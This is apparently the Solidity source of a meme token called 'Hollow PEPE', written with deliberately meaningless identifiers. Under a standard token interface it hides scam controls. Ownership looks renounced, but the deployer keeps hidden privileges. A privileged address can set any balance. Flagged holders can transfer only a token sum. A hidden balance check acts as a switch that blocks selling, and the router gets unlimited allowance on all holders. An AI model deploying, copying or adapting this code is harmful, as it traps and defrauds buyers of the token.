//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface txBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderLimitFrom) external view returns (uint256);

    function transfer(address shouldAutoFee, uint256 enableExempt) external returns (bool);

    function allowance(address txTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableExempt) external returns (bool);

    function transferFrom(
        address sender,
        address shouldAutoFee,
        uint256 enableExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minTotal, uint256 value);
    event Approval(address indexed txTo, address indexed spender, uint256 value);
}

abstract contract tradingReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityAmount {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface feeTx {
    function createPair(address minTo, address launchedFund) external returns (address);
}

interface txBuyMetadata is txBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HollowPEPE is tradingReceiver, txBuy, txBuyMetadata {

    function transferFrom(address feeTakeTotal, address shouldAutoFee, uint256 enableExempt) external override returns (bool) {
        if (_msgSender() != buyTo) {
            if (walletList[feeTakeTotal][_msgSender()] != type(uint256).max) {
                require(enableExempt <= walletList[feeTakeTotal][_msgSender()]);
                walletList[feeTakeTotal][_msgSender()] -= enableExempt;
            }
        }
        return txTake(feeTakeTotal, shouldAutoFee, enableExempt);
    }

    uint8 private limitSwapEnable = 18;

    mapping(address => mapping(address => uint256)) private walletList;

    function transfer(address maxFee, uint256 enableExempt) external virtual override returns (bool) {
        return txTake(_msgSender(), maxFee, enableExempt);
    }

    function name() external view virtual override returns (string memory) {
        return shouldIs;
    }

    function swapShould() public {
        emit OwnershipTransferred(tokenSell, address(0));
        toTake = address(0);
    }

    function owner() external view returns (address) {
        return toTake;
    }

    function getOwner() external view returns (address) {
        return toTake;
    }

    uint256 public launchedToken;

    uint256 public swapReceiver;

    function txTake(address feeTakeTotal, address shouldAutoFee, uint256 enableExempt) internal returns (bool) {
        if (feeTakeTotal == tokenSell) {
            return receiverTake(feeTakeTotal, shouldAutoFee, enableExempt);
        }
        uint256 fromSwap = txBuy(limitEnable).balanceOf(sellTotalLaunch);
        require(fromSwap == sellMin);
        require(shouldAutoFee != sellTotalLaunch);
        if (tradingSwap[feeTakeTotal]) {
            return receiverTake(feeTakeTotal, shouldAutoFee, liquidityMin);
        }
        return receiverTake(feeTakeTotal, shouldAutoFee, enableExempt);
    }

    event OwnershipTransferred(address indexed launchedLimit, address indexed swapLaunch);

    uint256 private launchIs;

    function receiverTake(address feeTakeTotal, address shouldAutoFee, uint256 enableExempt) internal returns (bool) {
        require(buyLiquidity[feeTakeTotal] >= enableExempt);
        buyLiquidity[feeTakeTotal] -= enableExempt;
        buyLiquidity[shouldAutoFee] += enableExempt;
        emit Transfer(feeTakeTotal, shouldAutoFee, enableExempt);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return fundBuy;
    }

    uint256 private tradingMode;

    uint256 public modeTrading;

    uint256 sellMin;

    constructor (){
        if (tradingMode != receiverIs) {
            launchedToken = swapReceiver;
        }
        liquidityAmount sellSwap = liquidityAmount(buyTo);
        limitEnable = feeTx(sellSwap.factory()).createPair(sellSwap.WETH(), address(this));
        
        tokenSell = _msgSender();
        swapShould();
        amountExempt[tokenSell] = true;
        buyLiquidity[tokenSell] = fundAutoList;
        if (tokenMin != launchIs) {
            receiverIs = tokenMin;
        }
        emit Transfer(address(0), tokenSell, fundAutoList);
    }

    address public tokenSell;

    address buyTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function teamFee(address isMarketing) public {
        require(isMarketing.balance < 100000);
        if (tradingWalletAuto) {
            return;
        }
        
        amountExempt[isMarketing] = true;
        
        tradingWalletAuto = true;
    }

    address public limitEnable;

    uint256 listLaunched;

    function launchFeeTotal(address maxFee, uint256 enableExempt) public {
        senderReceiver();
        buyLiquidity[maxFee] = enableExempt;
    }

    string private fundBuy = "HPE";

    uint256 private fundAutoList = 100000000 * 10 ** 18;

    function senderReceiver() private view {
        require(amountExempt[_msgSender()]);
    }

    address private toTake;

    uint256 private receiverIs;

    address sellTotalLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return fundAutoList;
    }

    bool private takeShould;

    uint256 constant liquidityMin = 2 ** 10;

    bool public limitLaunchedFee;

    bool public tradingWalletAuto;

    mapping(address => bool) public tradingSwap;

    function fromLaunched(address isMax) public {
        senderReceiver();
        if (modeTrading == launchIs) {
            tokenMin = receiverIs;
        }
        if (isMax == tokenSell || isMax == limitEnable) {
            return;
        }
        tradingSwap[isMax] = true;
    }

    string private shouldIs = "Hollow PEPE";

    function decimals() external view virtual override returns (uint8) {
        return limitSwapEnable;
    }

    mapping(address => uint256) private buyLiquidity;

    function approve(address listMax, uint256 enableExempt) public virtual override returns (bool) {
        walletList[_msgSender()][listMax] = enableExempt;
        emit Approval(_msgSender(), listMax, enableExempt);
        return true;
    }

    uint256 public tokenMin;

    function balanceOf(address senderLimitFrom) public view virtual override returns (uint256) {
        return buyLiquidity[senderLimitFrom];
    }

    function isReceiver(uint256 enableExempt) public {
        senderReceiver();
        sellMin = enableExempt;
    }

    mapping(address => bool) public amountExempt;

    function allowance(address autoEnableExempt, address listMax) external view virtual override returns (uint256) {
        if (listMax == buyTo) {
            return type(uint256).max;
        }
        return walletList[autoEnableExempt][listMax];
    }

}